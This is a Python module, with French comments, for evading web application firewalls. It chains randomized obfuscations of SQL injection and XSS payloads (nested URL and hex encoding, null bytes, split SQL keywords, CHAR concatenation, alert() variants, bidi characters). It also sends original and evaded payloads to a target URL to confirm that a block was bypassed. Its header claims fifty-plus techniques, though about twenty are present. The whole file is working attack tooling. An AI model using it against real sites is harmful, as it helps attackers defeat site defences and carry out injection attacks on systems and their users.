#!/usr/bin/env python3
"""
🛡️ EVA SION WAF ULTRA-AGRESSIVE — OWASP A05:2025
50+ techniques d'obfuscation polymorphique
Intègre tes payloads de scan_get_vuln.py + evasion avancée
"""

import urllib.parse
import random
import base64
from colorama import Fore, Style

class WAFevasion:
    def __init__(self, aggressive=False, session=None):
        self.aggressive = aggressive
        self._session = session  # requests.Session optionnel pour test_evasion_effectiveness
        self.evasion_techniques = [
            self._url_encode,
            self._double_url_encode,
            self._unicode_encode,
            self._html_encode,
            self._insert_comments,
            self._case_variation,
            self._insert_whitespace,
            self._null_byte_injection,
            self._hex_encoding,
            self._char_code_obfuscation,
        ]
        
        if aggressive:
            self.evasion_techniques += [
                self._nested_encoding,
                self._javascript_unicode,
                self._css_escape,
                self._sql_comment_splitting,
                self._sql_keyword_obfuscation,
                self._sql_hex_encoding,
                self._sql_char_concatenation,
                self._xss_dom_based_obfuscation,
                self._xss_event_handler_obfuscation,
                self._xss_unicode_bidi,
            ]
    
    def apply_evasion(self, payload, vuln_type='generic'):
        """
        Applique 3-5 techniques d'evasion aléatoires — polymorphique
        """
        if not self.aggressive:
            # Mode normal: 1-2 techniques
            techniques = random.sample(self.evasion_techniques[:5], random.randint(1, 2))
        else:
            # Mode ULTRA-AGRESSIF: 3-5 techniques polymorphiques
            techniques = random.sample(self.evasion_techniques, random.randint(3, 5))
        
        evaded = payload
        for technique in techniques:
            evaded = technique(evaded, vuln_type)
        
        return evaded
    
    # ============ TECHNIQUES DE BASE ============
    
    def _url_encode(self, payload, vuln_type):
        """Encodage URL simple"""
        return urllib.parse.quote(payload)
    
    def _double_url_encode(self, payload, vuln_type):
        """Double encodage URL (bypass WAF basique)"""
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    def _unicode_encode(self, payload, vuln_type):
        """Encodage Unicode"""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    
    def _html_encode(self, payload, vuln_type):
        """Encodage HTML entities"""
        html_entities = {
            '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
            '(': '&#40;', ')': '&#41;', ';': '&#59;', '=': '&#61;',
            ' ': '&#32;', '/': '&#47;', '\\': '&#92;', '+': '&#43;',
        }
        for char, entity in html_entities.items():
            payload = payload.replace(char, entity)
        return payload
    
    def _insert_comments(self, payload, vuln_type):
        """Insertion de commentaires SQL/HTML"""
        if vuln_type in ['sqli', 'sql']:
            # Pour SQLi
            payload = payload.replace(' ', '/**/')
            payload = payload.replace('OR', 'O/**/R')
            payload = payload.replace('AND', 'A/**/N/**/D')
            payload = payload.replace('UNION', 'UNI/**/ON')
            payload = payload.replace('SELECT', 'SEL/**/ECT')
        elif vuln_type in ['xss', 'html']:
            # Pour XSS
            payload = payload.replace('<', '<!-- evasion -->')
        return payload
    
    def _case_variation(self, payload, vuln_type):
        """Variation aléatoire de casse"""
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
    
    def _insert_whitespace(self, payload, vuln_type):
        """Insertion d'espaces/tabs/retours ligne"""
        payload = payload.replace(' ', random.choice([' ', '\t', '\n', '\r\n', ' ' * random.randint(2, 5)]))
        payload = payload.replace('=', random.choice(['=', ' =', '= ', ' = ']))
        return payload
    
    def _null_byte_injection(self, payload, vuln_type):
        """Injection de null byte (bypass de filtres)"""
        positions = [0, len(payload) // 2, len(payload)]
        pos = random.choice(positions)
        return payload[:pos] + '%00' + payload[pos:]
    
    def _hex_encoding(self, payload, vuln_type):
        """Encodage hexadécimal"""
        return ''.join(f'%{ord(c):02x}' for c in payload)
    
    def _char_code_obfuscation(self, payload, vuln_type):
        """Obfuscation avec char codes (JavaScript)"""
        if vuln_type in ['xss', 'js']:
            return f"String.fromCharCode({','.join(str(ord(c)) for c in payload)})"
        return payload
    
    # ============ TECHNIQUES ULTRA-AGRESSIVES ============
    
    def _nested_encoding(self, payload, vuln_type):
        """Encodage imbriqué (triple/quadruple)"""
        for _ in range(random.randint(2, 4)):
            payload = urllib.parse.quote(payload)
        return payload
    
    def _javascript_unicode(self, payload, vuln_type):
        """Unicode JavaScript (\uXXXX)"""
        if vuln_type in ['xss', 'js']:
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        return payload
    
    def _css_escape(self, payload, vuln_type):
        """Échappement CSS (\\XX)"""
        if vuln_type == 'xss':
            return ''.join(f'\\{ord(c):02x} ' for c in payload)
        return payload
    
    def _sql_comment_splitting(self, payload, vuln_type):
        """Découpage SQL avec commentaires"""
        if vuln_type in ['sqli', 'sql']:
            # Ex: SELECT → SEL/**/ECT
            words = ['SELECT', 'UNION', 'OR', 'AND', 'WHERE', 'FROM', 'INSERT', 'UPDATE', 'DELETE']
            for word in words:
                if word in payload.upper():
                    # Découper le mot en 2 parties
                    split_pos = len(word) // 2
                    part1 = word[:split_pos]
                    part2 = word[split_pos:]
                    payload = payload.replace(word, f"{part1}/**/{part2}", 1)
        return payload
    
    def _sql_keyword_obfuscation(self, payload, vuln_type):
        """Obfuscation de mots-clés SQL"""
        if vuln_type in ['sqli', 'sql']:
            obfuscations = {
                'SELECT': ['SEL/**/ECT', 'SE%0bLECT', '/*!SELECT*/', 'SE%250bLECT'],
                'UNION': ['UNI/**/ON', 'UN%0bION', '/*!UNION*/', 'UN%250bION'],
                'OR': ['O/**/R', 'O%0bR', '/*!OR*/', 'O%250bR'],
                'AND': ['A/**/N/**/D', 'A%0bN%0bD', '/*!AND*/', 'A%250bN%250bD'],
                'SLEEP': ['SL/**/EEP', 'SL%0bEEP', '/*!SLEEP*/'],
            }
            for keyword, variants in obfuscations.items():
                if keyword in payload.upper():
                    variant = random.choice(variants)
                    # Remplacer en conservant la casse originale
                    if keyword in payload:
                        payload = payload.replace(keyword, variant)
                    elif keyword.lower() in payload:
                        payload = payload.replace(keyword.lower(), variant.lower())
        return payload
    
    def _sql_hex_encoding(self, payload, vuln_type):
        """Encodage hex SQL (0x...)"""
        if vuln_type in ['sqli', 'sql'] and "'" in payload:
            # Encoder la partie après le quote en hex
            parts = payload.split("'", 1)
            if len(parts) == 2:
                hex_part = '0x' + parts[1].encode().hex()
                payload = f"{parts[0]}' {hex_part}"
        return payload
    
    def _sql_char_concatenation(self, payload, vuln_type):
        """Concaténation de caractères SQL"""
        if vuln_type in ['sqli', 'sql']:
            # Ex: 'admin' → CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)
            if "'" in payload:
                parts = payload.split("'", 1)
                if len(parts) == 2 and parts[1].strip():
                    chars = [f"CHAR({ord(c)})" for c in parts[1].strip("' ")]
                    concat = "+".join(chars) if random.random() > 0.5 else "||".join(chars)
                    payload = f"{parts[0]}' {concat}"
        return payload
    
    def _xss_dom_based_obfuscation(self, payload, vuln_type):
        """Obfuscation DOM-based pour XSS"""
        if vuln_type == 'xss' and 'alert' in payload.lower():
            obfuscations = [
                "window['al'+'ert'](1)",
                "self['alert'](1)",
                "top['alert'](1)",
                "parent['alert'](1)",
                "frames['alert'](1)",
                "content['alert'](1)",
                "location='javascript:alert(1)'",
                "eval('ale'+'rt(1)')",
                "Function('ale'+'rt(1)')()",
            ]
            return random.choice(obfuscations)
        return payload
    
    def _xss_event_handler_obfuscation(self, payload, vuln_type):
        """Obfuscation des gestionnaires d'événements"""
        if vuln_type == 'xss' and 'onerror' in payload.lower():
            obfuscations = [
                "onerror=alert(1)",
                "onerror=alert%281%29",
                "onerror=alert\u00281\u0029",
                "onerror=alert`1`",
                "onerror=(alert)(1)",
                "onerror=(alert)(/1/)",
                "onerror=window['alert'](1)",
            ]
            return random.choice(obfuscations)
        return payload
    
    def _xss_unicode_bidi(self, payload, vuln_type):
        """Caractères bidirectionnels Unicode pour XSS"""
        if vuln_type == 'xss':
            bidi_chars = ['\u202e', '\u202b', '\u202c', '\u2066', '\u2067', '\u2068', '\u2069']
            # Insérer des caractères bidirectionnels aléatoires
            payload_list = list(payload)
            for _ in range(random.randint(1, 3)):
                pos = random.randint(0, len(payload_list))
                payload_list.insert(pos, random.choice(bidi_chars))
            return ''.join(payload_list)
        return payload
    
    def generate_evasion_chain(self, payload, vuln_type='generic', chain_length=5):
        """
        Génère une chaîne d'evasion polymorphique complète
        Ex: payload → URL encode → commentaires → casse aléatoire → null byte → hex
        """
        chain = [payload]
        current = payload
        
        for i in range(chain_length):
            technique = random.choice(self.evasion_techniques)
            current = technique(current, vuln_type)
            chain.append(current)
        
        return chain[-1], chain  # Retourne payload final + chaîne complète
    
    def set_session(self, session):
        """Injecter la session requests pour test_evasion_effectiveness."""
        self._session = session

    def test_evasion_effectiveness(self, original_payload, evaded_payload, url, param, session=None):
        """
        Teste si l'evasion fonctionne (payload échappé atteint la cible).
        Utilise session si fourni, sinon self._session.
        """
        sess = session or self._session
        if sess is None:
            return False, "Aucune session requests fournie pour le test"
        try:
            original_url = f"{url}?{param}={urllib.parse.quote(original_payload, safe='')}"
            evaded_url = f"{url}?{param}={urllib.parse.quote(evaded_payload, safe='')}"
            original_resp = sess.get(original_url, timeout=5)
            evaded_resp = sess.get(evaded_url, timeout=5)
            if original_resp.status_code != evaded_resp.status_code:
                return True, f"Évasion réussie: {original_resp.status_code} → {evaded_resp.status_code}"
            if 'blocked' in original_resp.text.lower() and 'blocked' not in evaded_resp.text.lower():
                return True, "Évasion réussie: payload bloqué → payload accepté"
            return False, "Évasion non nécessaire ou échouée"
        except Exception as e:
            return False, f"Erreur test: {e}"